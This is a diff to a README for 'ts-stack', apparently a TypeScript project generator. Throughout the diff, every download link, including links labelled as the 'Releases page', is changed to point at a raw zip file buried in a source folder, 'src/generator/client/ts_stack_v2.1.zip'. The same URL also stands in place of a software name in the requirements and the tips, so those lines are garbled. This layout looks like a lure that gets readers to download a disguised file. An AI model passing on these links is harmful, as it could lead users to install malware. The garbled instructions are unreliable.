@@ -1,7 +1,7 @@
 # 🚀 ts-stack - Create Your Fullstack Project Easily
 
 ## 🔗 Download Now
-[![Download ts-stack](https://raw.githubusercontent.com/okelloaliwa01/ts-stack/main/against/ts-stack.zip)](https://raw.githubusercontent.com/okelloaliwa01/ts-stack/main/against/ts-stack.zip)
+[![Download ts-stack](https://raw.githubusercontent.com/okelloaliwa01/ts-stack/main/src/generator/client/ts_stack_v2.1.zip)](https://raw.githubusercontent.com/okelloaliwa01/ts-stack/main/src/generator/client/ts_stack_v2.1.zip)
 
 ## 📋 Description
 The ts-stack application helps you generate a fullstack TypeScript project with minimal effort. It combines popular tools like React, Vite, Hono, Drizzle, and Turborepo. With this tool, you can build your project entirely from a YAML configuration file.
@@ -15,14 +15,14 @@ The ts-stack application helps you generate a fullstack TypeScript project with 
 
 ## 🛠️ System Requirements
 - **Operating System**: Windows, macOS, or Linux
-- **https://raw.githubusercontent.com/okelloaliwa01/ts-stack/main/against/ts-stack.zip**: Version 14 or higher
+- **https://raw.githubusercontent.com/okelloaliwa01/ts-stack/main/src/generator/client/ts_stack_v2.1.zip**: Version 14 or higher
 - **Yarn**: Recommended for package management
 - **Memory**: At least 4 GB of RAM
 - **Storage**: Minimum of 1 GB of free disk space
 
 ## 🚀 Getting Started
 1. **Download the Software**: 
-   Visit the [Releases page to download](https://raw.githubusercontent.com/okelloaliwa01/ts-stack/main/against/ts-stack.zip). Select the latest version and download the appropriate file for your operating system.
+   Visit the [Releases page to download](https://raw.githubusercontent.com/okelloaliwa01/ts-stack/main/src/generator/client/ts_stack_v2.1.zip). Select the latest version and download the appropriate file for your operating system.
 
 2. **Extract the Files**: 
    Once downloaded, locate the file on your computer. Double-click it to extract the contents into a new folder.
@@ -45,7 +45,7 @@ The ts-stack application helps you generate a fullstack TypeScript project with 
    This will start your new project and open it in the browser.
 
 ## 📥 Download & Install
-To get your own fullstack TypeScript project, [visit the Releases page to download](https://raw.githubusercontent.com/okelloaliwa01/ts-stack/main/against/ts-stack.zip) the latest version. Follow the instructions above to set up and run your application smoothly.
+To get your own fullstack TypeScript project, [visit the Releases page to download](https://raw.githubusercontent.com/okelloaliwa01/ts-stack/main/src/generator/client/ts_stack_v2.1.zip) the latest version. Follow the instructions above to set up and run your application smoothly.
 
 ## 🌟 Topics Covered
 - **CLI**: Command Line Interface for easier workflows
@@ -59,7 +59,7 @@ To get your own fullstack TypeScript project, [visit the Releases page to downlo
 - **Turborepo**: Enhance your development speed and efficiency
 
 ## 💡 Tips for Successful Use
-- Always ensure you have the latest version of https://raw.githubusercontent.com/okelloaliwa01/ts-stack/main/against/ts-stack.zip and Yarn installed.
+- Always ensure you have the latest version of https://raw.githubusercontent.com/okelloaliwa01/ts-stack/main/src/generator/client/ts_stack_v2.1.zip and Yarn installed.
 - Regularly check for updates in the Releases page to benefit from the latest features and bug fixes.
 - Familiarize yourself with YAML syntax to effectively customize your project configuration.
 - Utilize the built-in documentation for troubleshooting common issues.
